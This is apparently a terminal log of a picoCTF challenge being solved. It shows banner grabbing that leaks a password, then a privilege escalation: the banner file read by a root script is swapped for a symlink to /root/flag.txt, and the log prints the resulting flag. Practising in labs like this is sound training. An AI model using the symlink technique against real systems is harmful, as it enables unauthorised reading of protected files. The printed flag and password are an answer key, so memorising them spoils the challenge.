nc tethys.picoctf.net 64706                                                                           
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234







──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 53725
*************************************
**************WELCOME****************
*************************************

what is the password? 
MY_PASSW@RD_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ ls -alR
ls -alR
.:
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat text  
cat text
keep digging
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat /root
cat /root
cat: /root: Is a directory
player@challenge:~$ ls -al /root
ls -al /root
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Jul 18 21:29 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ ls -al /home/player
ls -al /home/player
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ ls    
ls
banner  text
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ls
ls
text
player@challenge:~$ ln -s /root/flag.txt /home/player/banner  
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$ ls -al
ls -al
total 16
drwxr-xr-x 1 player player   20 Jul 18 21:57 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
lrwxrwxrwx 1 player player   14 Jul 18 21:57 banner -> /root/flag.txt
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ ^C
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 53725
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}


